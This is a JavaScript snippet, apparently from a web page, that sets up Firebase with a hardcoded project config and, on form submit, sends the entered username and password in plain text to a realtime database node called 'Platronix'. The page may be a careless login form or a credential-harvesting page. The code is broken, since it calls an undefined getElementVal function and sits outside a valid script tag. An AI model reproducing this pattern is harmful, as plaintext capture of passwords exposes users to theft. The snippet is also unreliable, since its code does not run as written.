<script src="https://www.gstatic.com/firebasejs/3.7.4/firebase.js"></script>

        
        let firebaseConfig = {
          apiKey: "AIzaSyAMstWHVnqvGOJIpAtfk-nAMzKn1hb_PlM",
          authDomain: "platronix.firebaseapp.com",
          databaseURL: "https://platronix-default-rtdb.firebaseio.com",
          projectId: "platronix",
          storageBucket: "platronix.appspot.com",
          messagingSenderId: "1035820636155",
          appId: "1:1035820636155:web:15ea0b42c681e3e3f41d5e"
        };
      
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        let PlatronixDB = firebase.database().ref('Platronix');
        document.getElementById('Platronix').addEventListener('submit',submitform);
      
        function submitform(e){
          e.preventDefault();
          let username = getElementVal('username');
          let password =getElementVal('password');
          saveMessasge(username,password);
          document.getElementById('Platronix').reset();
      
        }
        function getInputVal(id){
          return document.getElementById(id).value;
        }
      
        function saveMessasge(username,password) {
          let newPlatronix = PlatronixDB.push();
          newPlatronix.set({
            username: username,
            password: password,
          });
        }
      
        
  
